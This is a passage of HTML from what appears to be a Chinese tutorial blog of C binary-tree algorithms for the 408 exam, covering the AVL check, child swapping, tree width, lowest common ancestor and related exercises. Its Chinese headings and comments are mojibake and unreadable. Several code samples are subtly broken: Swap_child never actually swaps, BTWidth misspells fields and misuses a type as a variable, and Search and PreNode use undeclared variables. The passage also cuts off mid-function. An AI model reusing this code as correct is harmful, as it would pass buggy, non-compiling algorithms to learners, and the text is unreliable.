punctuation">,</span>bl<span class="token punctuation">,</span>h1<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">judge_AVL</span><span class="token punctuation">(</span>T<span class="token operator">-></span>rchild<span class="token punctuation">,</span>br<span class="token punctuation">,</span>h2<span class="token punctuation">)</span><span class="token punctuation">;</span>h <span class="token operator">=</span> <span class="token punctuation">(</span>hl<span class="token operator">></span> hr <span class="token operator">?</span> hl<span class="token operator">:</span>hr<span class="token punctuation">)</span> <span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">abs</span><span class="token punctuation">(</span>hl<span class="token operator">-</span>hr<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment">// é«˜åº¦å·® å°äº2 </span>balance <span class="token operator">=</span> bl <span class="token operator">&amp;&amp;</span> br<span class="token punctuation">;</span>  <span class="token comment">//é€»è¾‘ä¸  å½“å·¦å³éƒ½å¹³è¡¡æ—¶, å¹³è¡¡</span><span class="token keyword">else</span>balance <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre>              </div>            </details></div><h2 id="13-é€’å½’å®ç°æ±‚äºŒå‰æ ‘åŒåˆ†æ”¯èŠ‚ç‚¹æ ‘">13) é€’å½’å®ç°æ±‚äºŒå‰æ ‘åŒåˆ†æ”¯èŠ‚ç‚¹æ ‘</h2><div class="story post-story"><details green><summary> code </summary>              <div class='content'>              <pre class="language-c++" data-language="c++"><code class="language-c++">&#x2F;** * [DsonNode é€’å½’å®ç°æ±‚äºŒå‰æ ‘åŒåˆ†æ”¯èŠ‚ç‚¹æ ‘] * @param  T [äºŒå‰é“¾è¡¨] * @return   [èŠ‚ç‚¹æ•°] *&#x2F;int DsonNode(BiTree T)&#123;if(T&#x3D;&#x3D;NULL)return 0;else if(T-&gt;lchild !&#x3D;NULL &amp;&amp; T-&gt;rchild !&#x3D;NULL ) &#x2F;&#x2F; å·¦å³å­©å­éƒ½æœ‰return DsonNode(T-&gt;lchild) + DsonNode(T-&gt;rchild) +1;elsereturn DsonNode(T-&gt;lchild) + DsonNode(T-&gt;rchild);&#125;</code></pre>              </div>            </details></div><h2 id="14-é€’å½’å®ç°å·¦å³å­©å­äº’æ¢">14) é€’å½’å®ç°å·¦å³å­©å­äº’æ¢</h2><div class="story post-story"><details green><summary> code </summary>              <div class='content'>              <pre class="language-c" data-language="c"><div class="caption"><span>++</span></div><code class="language-c"><span class="token comment">/** * [Swap_child é€’å½’å®ç°å·¦å³å­©å­äº’æ¢] * @param T [description] * å…ˆæ¢Tç»“ç‚¹ å·¦å­æ ‘å·¦å³å­©å­ * å†æ¢å³å­æ ‘,  * æœ€åèŠ‚ç‚¹çš„å­©å­äº’æ¢ */</span><span class="token keyword">void</span> <span class="token function">Swap_child</span><span class="token punctuation">(</span>Bitree T<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span>T<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">Swap_child</span><span class="token punctuation">(</span>T<span class="token operator">-></span>lchild<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// å…ˆå·¦å­æ ‘</span><span class="token function">Swap_child</span><span class="token punctuation">(</span>T<span class="token operator">-></span>rchild<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// å³å­æ ‘</span>Bitree temp <span class="token operator">=</span> T<span class="token operator">-></span>lchild<span class="token punctuation">;</span> <span class="token comment">// å·¦å³å­©å­äº’æ¢</span>T<span class="token operator">-></span>lchild <span class="token operator">=</span> T<span class="token operator">-></span>rchild<span class="token punctuation">;</span>T<span class="token operator">-></span>lchild <span class="token operator">=</span> temp<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre>              </div>            </details></div><h2 id="15-åˆ é™¤äºŒå‰æ ‘ä¸­æ¯ä¸ªå…ƒç´ å€¼-ä¸ºxçš„ç»“ç‚¹">15) åˆ é™¤äºŒå‰æ ‘ä¸­æ¯ä¸ªå…ƒç´ å€¼ ä¸ºxçš„ç»“ç‚¹</h2><div class="story post-story"><details green><summary> code </summary>              <div class='content'>              <pre class="language-c" data-language="c"><div class="caption"><span>++</span></div><code class="language-c"><span class="token comment">/** * [Search åˆ é™¤äºŒå‰æ ‘ä¸­æ¯ä¸ªå…ƒç´ å€¼ ä¸ºxçš„ç»“ç‚¹] * å¹¶åˆ å»ä»¥ä»–ä¸ºæ ¹çš„å­æ ‘ * @param T [description] * @param x [description] * ååºéå†äºŒå‰æ ‘, å±‚æ¬¡éå†æ‰¾åˆ°ç»“ç‚¹çš„çˆ¶èŠ‚ç‚¹ */</span><span class="token keyword">void</span> <span class="token function">Search</span><span class="token punctuation">(</span>BiTree T<span class="token punctuation">,</span>ElemType x<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>BiTree Q<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>T<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span>T<span class="token operator">-></span>data <span class="token operator">==</span> x<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">DeleteXTree</span><span class="token punctuation">(</span>T<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>InitQueue Q<span class="token punctuation">;</span><span class="token function">EnQueue</span><span class="token punctuation">(</span>Q<span class="token punctuation">,</span>T<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">IsEmpty</span><span class="token punctuation">(</span>Q<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">DeQueue</span><span class="token punctuation">(</span>Q<span class="token punctuation">,</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>p<span class="token operator">-></span>lchild<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token comment">// å·¦éç©º</span><span class="token keyword">if</span><span class="token punctuation">(</span>p<span class="token operator">-></span>lchild<span class="token operator">-></span>data <span class="token operator">==</span> x<span class="token punctuation">)</span>  <span class="token comment">// å·¦å­æ ‘ç¬¦åˆ, åˆ é™¤å·¦å­æ ‘</span><span class="token punctuation">&#123;</span><span class="token function">DeleteXTree</span><span class="token punctuation">(</span>p<span class="token operator">-></span>lchild<span class="token punctuation">)</span><span class="token punctuation">;</span>p<span class="token operator">-></span>lchild <span class="token operator">=</span>  <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span>  <span class="token comment">// çˆ¶èŠ‚ç‚¹å·¦å­æ ‘ç½®ä¸ºç©º</span><span class="token function">EnQueue</span><span class="token punctuation">(</span>Q<span class="token punctuation">,</span>p<span class="token operator">-></span>lchild<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//å·¦å­å¥³å…¥é˜Ÿåˆ—</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span>p<span class="token operator">-></span>rchild<span class="token punctuation">)</span>  <span class="token comment">// å³å­æ ‘ç¬¦åˆ, åˆ é™¤å³å­æ ‘</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span>p<span class="token operator">-></span>rchild<span class="token operator">-></span>data <span class="token operator">==</span> x<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">DeleteXTree</span><span class="token punctuation">(</span>p<span class="token operator">-></span>rchild<span class="token punctuation">)</span><span class="token punctuation">;</span>p<span class="token operator">-></span>rchild <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token function">EnQueue</span><span class="token punctuation">(</span>Q<span class="token punctuation">,</span>p<span class="token operator">-></span>rchild<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// å³å­å¥³å…¥é˜Ÿåˆ—</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre>              </div>            </details></div><h2 id="16-æ±‚å…ˆåºéå†ä¸­ç¬¬kä¸ªç»“ç‚¹çš„å€¼">16) æ±‚å…ˆåºéå†ä¸­ç¬¬kä¸ªç»“ç‚¹çš„å€¼</h2><div class="story post-story"><details green><summary> code </summary>              <div class='content'>              <pre class="language-c" data-language="c"><div class="caption"><span>++</span></div><code class="language-c"><span class="token comment">/** * [PreNode æ±‚å…ˆåºéå†ä¸­ç¬¬kä¸ªç»“ç‚¹çš„å€¼] * @param  Bt [description] * @param  k  [description] * @return    [description] */</span><span class="token keyword">int</span> count <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>ElemType <span class="token function">PreNode</span><span class="token punctuation">(</span>BiTree T<span class="token punctuation">,</span> <span class="token keyword">int</span> k<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span>T <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token keyword">return</span> <span class="token string">'#'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span> count <span class="token operator">==</span> k<span class="token punctuation">)</span><span class="token keyword">return</span> T<span class="token operator">-></span>data<span class="token punctuation">;</span>count<span class="token operator">++</span><span class="token punctuation">;</span>ch <span class="token operator">=</span> <span class="token function">PreNode</span><span class="token punctuation">(</span>T<span class="token operator">-></span>lchild<span class="token punctuation">,</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// å·¦å­æ ‘è¿”å›è¯¥å€¼</span><span class="token keyword">if</span><span class="token punctuation">(</span>ch <span class="token operator">!=</span> <span class="token string">'#'</span><span class="token punctuation">)</span><span class="token keyword">return</span> ch<span class="token punctuation">;</span>ch <span class="token operator">=</span> <span class="token function">PreNode</span><span class="token punctuation">(</span>T<span class="token operator">-></span>rchild<span class="token punctuation">,</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// å³å­æ ‘é€’å½’æŸ¥æ‰¾</span><span class="token keyword">return</span> ch<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>              </div>            </details></div><h2 id="17-æ±‚ä»£æƒè·¯å¾„é•¿åº¦å’Œ">17) æ±‚ä»£æƒè·¯å¾„é•¿åº¦å’Œ</h2><div class="story post-story"><details green><summary> code </summary>              <div class='content'>              <pre class="language-c" data-language="c"><div class="caption"><span>++</span></div><code class="language-c"><span class="token comment">/** * [Wpl_preOreder æ±‚ä»£æƒè·¯å¾„é•¿åº¦å’Œ] * @param  T    [description] * @param  deep [description] * @return      [description] * 2014 408 çœŸé¢˜ , ç‹é“127é¡µ */</span><span class="token keyword">int</span> <span class="token function">Wpl</span><span class="token punctuation">(</span>BiTree T<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token function">Wpl_preOreder</span><span class="token punctuation">(</span>T<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> wpl <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">Wpl_preOreder</span><span class="token punctuation">(</span>BiTree T<span class="token punctuation">,</span><span class="token keyword">int</span> deep<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span>T<span class="token operator">-></span>lchild <span class="token operator">==</span> <span class="token constant">NULL</span> <span class="token operator">&amp;&amp;</span> T<span class="token operator">-></span>rchild <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token comment">// å¶èŠ‚ç‚¹ è¿”å› wp</span>wpl <span class="token operator">+=</span> deep <span class="token operator">*</span> T<span class="token operator">-></span>data<span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>T<span class="token operator">-></span>lchild <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token function">Wpl_preOreder</span><span class="token punctuation">(</span>T<span class="token operator">-></span>lchild<span class="token punctuation">,</span>deep<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>T<span class="token operator">-></span>rchild <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token function">Wpl_preOreder</span><span class="token punctuation">(</span>T<span class="token operator">-></span>rchild<span class="token punctuation">,</span>deep<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> wpl<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>              </div>            </details></div><h2 id="18-æ±‚éç©ºäºŒå‰æ ‘çš„å®½åº¦">18) æ±‚éç©ºäºŒå‰æ ‘çš„å®½åº¦</h2><div class="story post-story"><details green><summary> code </summary>              <div class='content'>              <pre class="language-c" data-language="c"><div class="caption"><span>++</span></div><code class="language-c"><span class="token comment">/** * [BTWidth æ±‚éç©ºäºŒå‰æ ‘çš„å®½åº¦] * @param  T [description] * @return   [description] * å±‚æ¬¡éå†æ±‚æ‰€æœ‰ç‚¹çš„å±‚æ¬¡,å°†æ‰€æœ‰èŠ‚ç‚¹å’Œå¯¹åº”å±‚æ¬¡æ”¾åœ¨ä¸€ä¸ªé˜Ÿåˆ—ä¸­ * æ‰«æé˜Ÿåˆ—,æ±‚æœ€å¤§å±‚æ¬¡èŠ‚ç‚¹æ€»æ•° */</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token punctuation">&#123;</span>BiTree data<span class="token punctuation">[</span>MAXN<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">// å­˜æ”¾æŒ‡é’ˆ</span><span class="token keyword">int</span> level<span class="token punctuation">[</span>MAXN<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//å±‚æ¬¡</span><span class="token keyword">int</span> front<span class="token punctuation">,</span>rear<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>Que<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">BTWidth</span><span class="token punctuation">(</span>BiTree T<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>BiTree p<span class="token punctuation">;</span>Que<span class="token punctuation">.</span>front <span class="token operator">=</span> Que<span class="token punctuation">.</span>rear <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>Que<span class="token punctuation">.</span>rear <span class="token operator">++</span><span class="token punctuation">;</span>Que<span class="token punctuation">.</span>data<span class="token punctuation">[</span>Que<span class="token punctuation">.</span>rear<span class="token punctuation">]</span> <span class="token operator">=</span> T<span class="token punctuation">;</span> <span class="token comment">// å…¥é˜Ÿ</span>Que<span class="token punctuation">.</span>level<span class="token punctuation">[</span>Que<span class="token punctuation">.</span>rear<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">// å±‚æ¬¡ä¸º1;</span><span class="token keyword">int</span> k<span class="token punctuation">,</span>Max<span class="token punctuation">,</span>n<span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span>Que<span class="token punctuation">.</span>front <span class="token operator">&lt;</span> Que<span class="token punctuation">.</span>rear<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>Que<span class="token punctuation">.</span>front <span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">// å‡ºé˜Ÿ</span>p <span class="token operator">=</span> Que<span class="token punctuation">.</span>data<span class="token punctuation">[</span>Que<span class="token punctuation">.</span>front<span class="token punctuation">]</span><span class="token punctuation">;</span>k <span class="token operator">=</span> Que<span class="token punctuation">.</span>level<span class="token punctuation">[</span>Que<span class="token punctuation">.</span>front<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>p<span class="token operator">-></span>lchlid <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token comment">// å·¦å­©å­è¿›é˜Ÿåˆ—</span><span class="token punctuation">&#123;</span>Que<span class="token punctuation">.</span>rear<span class="token operator">++</span><span class="token punctuation">;</span>Que<span class="token punctuation">.</span>data<span class="token punctuation">[</span>rear<span class="token punctuation">]</span> <span class="token operator">=</span> p<span class="token operator">-></span>lchlid<span class="token punctuation">;</span>Que<span class="token punctuation">.</span>level<span class="token punctuation">[</span>rear<span class="token punctuation">]</span> <span class="token operator">=</span>  k <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span>p<span class="token operator">-></span>rchild<span class="token operator">!=</span><span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token comment">// å³å­©å­è¿›é˜Ÿåˆ—</span><span class="token punctuation">&#123;</span>Que<span class="token punctuation">.</span>rear<span class="token operator">++</span><span class="token punctuation">;</span>Que<span class="token punctuation">.</span>data<span class="token punctuation">[</span>rear<span class="token punctuation">]</span> <span class="token operator">=</span> p<span class="token operator">-></span>rchlid<span class="token punctuation">;</span>Que<span class="token punctuation">.</span>level<span class="token punctuation">[</span>rear<span class="token punctuation">]</span> <span class="token operator">=</span>  k <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>Max <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> k <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span> i <span class="token operator">&lt;</span> Que<span class="token punctuation">.</span>rear<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    n <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>i<span class="token operator">&lt;</span>Que<span class="token punctuation">.</span>rear <span class="token operator">&amp;&amp;</span> Que<span class="token punctuation">.</span>level<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> k<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// ç»Ÿè®¡ç¬¬kæ›¾èŠ‚ç‚¹æ•°</span>        n<span class="token operator">++</span><span class="token punctuation">;</span>        i<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    k <span class="token operator">=</span> Que<span class="token punctuation">.</span>level<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> n <span class="token operator">></span> Max<span class="token punctuation">)</span>    Max <span class="token operator">=</span> n<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> Max<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>              </div>            </details></div><h2 id="19-åˆ¤æ–­ä¸¤é¢—äºŒå‰æ ‘æ˜¯å¦ç»“æ„ç›¸åŒ">19) åˆ¤æ–­ä¸¤é¢—äºŒå‰æ ‘æ˜¯å¦ç»“æ„ç›¸åŒ</h2><div class="story post-story"><p><img src="https://img-blog.csdnimg.cn/20200826211709293.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpemFpZg==,size_16,color_FFFFFF,t_70#pic_center" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200826211709293.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpemFpZg==,size_16,color_FFFFFF,t_70#pic_center" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><details green><summary> code </summary>              <div class='content'>              <pre class="language-c" data-language="c"><div class="caption"><span>++</span></div><code class="language-c"><span class="token comment">/** * [åˆ¤æ–­ä¸¤ä¸ªäºŒå‰æ ‘ç»“æ„æ˜¯å¦ç›¸ç­‰] * @param  T1 [description] * @param  T2 [description] * @return    [description] */</span><span class="token keyword">int</span> <span class="token function">isEqual</span><span class="token punctuation">(</span>BiTree T1<span class="token punctuation">,</span>BiTree T2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token operator">!</span>T1 <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>T2<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token operator">!</span>T1 <span class="token operator">||</span> <span class="token operator">!</span>T2<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token function">isEqual</span><span class="token punctuation">(</span> T1<span class="token operator">-></span>lson<span class="token punctuation">,</span>T2<span class="token operator">-></span>lson<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isEqual</span><span class="token punctuation">(</span>T1<span class="token operator">-></span>rson<span class="token punctuation">,</span>T2<span class="token operator">-></span>rson<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span></code></pre>              </div>            </details></div><h2 id="20-æ±‚ä¸¤ä¸ªç»“ç‚¹çš„æœ€ä½-è¿‘-å…¬å…±ç¥–å…ˆç»“ç‚¹">20) æ±‚ä¸¤ä¸ªç»“ç‚¹çš„æœ€ä½(è¿‘)å…¬å…±ç¥–å…ˆç»“ç‚¹</h2><div class="story post-story"><p><img src="https://img-blog.csdnimg.cn/20200826211723957.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpemFpZg==,size_16,color_FFFFFF,t_70#pic_center" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200826211723957.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpemFpZg==,size_16,color_FFFFFF,t_70#pic_center" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><details green><summary> code </summary>              <div class='content'>              <pre class="language-c" data-language="c"><div class="caption"><span>++</span></div><code class="language-c"><span class="token comment">/** * [æ±‚ä¸¤ä¸ªç»“ç‚¹çš„æœ€ä½å…¬å…±ç¥–å…ˆç»“ç‚¹] * @param  T [description] * @param  A [description] * @param  B [description] * @return   [description] */</span>BiTree <span class="token function">lowAnc</span><span class="token punctuation">(</span>BiTree T<span class="token punctuation">,</span>BiTree A<span class="token punctuation">,</span>BiTree B<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token operator">!</span>T<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span> T <span class="token operator">==</span> A <span class="token operator">||</span> T <span class="token operator">==</span> B<span class="token punctuation">)</span> <span class="token keyword">return</span> T<span class="token punctuation">;</span> <span class="token comment">// è¯´æ˜åœ¨æŸå·¦å­æ ‘æˆ–å³å­æ ‘ä¸­æ‰¾åˆ°ç›®æ ‡ç»“ç‚¹</span>BiTree left <span class="token operator">=</span> <span class="token function">lowAnc</span><span class="token punctuation">(</span>T<span class="token operator">-></span>lson<span class="token punctuation">,</span>A<span class="token punctuation">,</span>B<span class="token punctuation">)</span><span class="token punctuation">;</span>BiTree right <span class="token operator">=</span> <span class="token function">lowAnc</span><span class="token punctuation">(</span>T<span class="token operator">-></span>rson<span class="token punctuation">,</span>A<span class="token punctuation">,</span>B<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// å½“åœ¨å·¦å­æ ‘å’Œå³å­æ ‘ä¸­éƒ½æ‰¾åˆ°A,B è¯´æ˜æ˜¯æœ€è¿‘çš„å…¬å…±ç¥–å…ˆ</span><span class="token keyword">if</span><span class="token punctuation">(</span> left <span class="token operator">!=</span> <span class="token constant">NULL</span> <span class="token operator">&amp;&amp;</span> right <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token keyword">return</span> T<span class="token punctuation">;</span>    <span class="token comment">//å¯¹ä¸€ä¸ªåº•å±‚å‘ä¸Šæ›´æ–°çš„æ ¹ç»“ç‚¹æ¥è¯´ï¼Œåªåœ¨å·¦å­æ ‘æˆ–å³å­æ ‘æ‰¾åˆ°äº†ç›®æ ‡ç»“ç‚¹ï¼Œåˆ™è¿”å›æ‰¾åˆ°çš„ç»“ç‚¹ã€‚</span><span class="token keyword">return</span> <span class="token operator">!</span>left <span class="token operator">?</span> right<span class="token operator">:</span>left<span class="token punctuation">;</span> <span class="token punctuation">&#125;</span></code></pre>              </div>            </details></div><h2 id="20-æ±‚ä»»æ„ä¸¤ç»“ç‚¹è·ç¦»">20+) æ±‚ä»»æ„ä¸¤ç»“ç‚¹è·ç¦»</h2><div class="story post-story"><p><img src="https://img-blog.csdnimg.cn/20200826211737387.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpemFpZg==,size_16,color_FFFFFF,t_70#pic_center" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200826211737387.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpemFpZg==,size_16,color_FFFFFF,t_70#pic_center" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><details green><summary> code </summary>              <div class='content'>              <pre class="language-c" data-language="c"><div class="caption"><span>++</span></div><code class="language-c"><span class="token comment">/** * [æ±‚ä¸¤ä¸ªç»“ç‚¹çš„æœ€ä½å…¬å…±ç¥–å…ˆç»“ç‚¹] * @param  T [description] * @param  A [description] * @param  B [description] * @return   [description] */</span>BiTree <span class="token function">lowAnc</span><span class="token punctuation">(</span>BiTree T<span class="token punctuation">,</span>BiTree A<span class="token punctuation">,</span>BiTree B<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token operator">!</span>T<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span> T <span class="token operator">==</span> A <span class="token operator">||</span> T <span class="token operator">==</span> B<span class="token punctuation">)</span> <span class="token keyword">return</span> T<span class="token punctuation">;</span> <span class="token comment">// è¯´æ˜åœ¨æŸå·¦å­æ ‘æˆ–å³å­æ ‘ä¸­æ‰¾åˆ°ç›®æ ‡ç»“ç‚¹</span>BiTree left <span class="token operator">=</span> <span class="token function">lowAnc</span><span class="token punctuation">(</span>T<span class="token operator">-></span>lson<span class="token punctuation">,</span>A<span class="token punctuation">,</span>B<span class="token punctuation">)</span><span class="token punctuation">;</span>BiTree right <span class="token operator">=</span> <span class="token function">lowAnc</span><span class="token punctuation">(</span>T<span class="token operator">-></span>rson<span class="token punctuation">,</span>A<span class="token punctuation">,</span>B<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span> left <span class="token operator">!=</span> <span class="token constant">NULL</span> <span class="token operator">&amp;&amp;</span> right <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token comment">// å½“åœ¨å·¦å­æ ‘å’Œå³å­æ ‘ä¸­éƒ½æ‰¾åˆ°A,B è¯´æ˜æ˜¯æœ€è¿‘çš„å…¬å…±ç¥–å…ˆ</span><span class="token keyword">return</span> T<span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token operator">!</span>left <span class="token operator">?</span> right<span class="token operator">:</span>left<span class="token punctuation">;</span> <span class="token comment">//å¯¹ä¸€ä¸ªåº•å±‚å‘ä¸Šæ›´æ–°çš„æ ¹ç»“ç‚¹æ¥è¯´ï¼Œåªåœ¨å·¦å­æ ‘æˆ–å³å­æ ‘æ‰¾åˆ°äº†ç›®æ ‡ç»“ç‚¹ï¼Œåˆ™è¿”å›æ‰¾åˆ°çš„ç»“ç‚¹ã€‚</span><span class="token punctuation">&#125;</span><span class="token comment">/** * [æ±‚æœ€è¿‘å…¬å…±ç¥–å…ˆåˆ°ç›®æ ‡pçš„è·ç¦»] * @param  T [description] * @param  p [description] * @return   [description] */</span><span class="token keyword">int</span> <span class="token function">CalDistance</span><span class="token punctuation">(</span>BiTree T<span class="token punctuation">,</span>BiTree p<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token operator">!</span>T <span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token operator">-</span><span 